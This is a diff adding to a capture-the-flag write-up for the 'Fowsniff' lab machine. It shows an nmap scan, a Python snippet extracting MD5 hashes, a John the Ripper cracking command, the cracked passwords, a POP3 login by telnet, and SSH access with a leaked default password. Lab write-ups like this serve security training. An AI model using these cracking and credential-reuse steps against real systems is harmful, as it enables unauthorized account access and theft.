@@ -3,6 +3,7 @@
 ## Using nmap, scan this machine. What ports are open?
 
 I used `nmap [target ip]` to scan for open ports on the machine, revealing:
+
 ```
 PORT    STATE SERVICE
 22/tcp  open  ssh
@@ -44,3 +45,54 @@ mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
 parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 ```
+
+I then used the following 'back of the envelope python' to grab just the hashes and save them in another txt file (wasn’t necessary using John the Ripper):
+
+```
+with open("hashes.txt") as reader:
+    with open("justhashes.txt", 'w') as writer:
+        for i in reader:
+            writer.write(str(i.split(":")[-1]))
+```
+
+I then used John the Ripper to crack the MD5 hases (web tools can also be used):
+
+```
+john --wordlist=/root/Desktop/Tools/wordlists/rockyou.txt --format=raw-MD5 hashes.txt
+```
+
+Giving us all the passwords (except for stone's!)
+
+```
+scoobydoo2       (seina@fowsniff)
+orlando12        (parede@fowsniff)
+apples01         (tegel@fowsniff)
+skyler22         (baksteen@fowsniff)
+mailcall         (mauer@fowsniff)
+07011972         (sciana@fowsniff)
+carp4ever        (mursten@fowsniff)
+bilbo101         (mustikka@fowsniff)
+```
+
+We can then log in to the pop3 mail server using _seina_'s credentials, using `telnet 10.10.85.5 110`. We can then log in as _seina_ and retrieve her emails.
+
+```
+USER seina
++OK
+PASS scoobydoo2
++OK Logged in.
+LIST
++OK 2 messages:
+1 1622
+2 1280
+.
+RETR 1
+RETR 2
+```
+
+We find out:
+- That there was/is an SQL database vulnerability
+- That the temporary SSH password is S1ck3nBluff+secureshell
+- Devin/seina has been away so may not have changed their password, and Skyler/bakesteen hasn't read AJ Stone's message about the SSH password, so likely hasn't changed it from the default.
+
+And as suspected, we can SSH into baksteen's account with the default password. We can then check the groups that baksteen is in with `groups baksteen` - _users_ and _baksteen_.
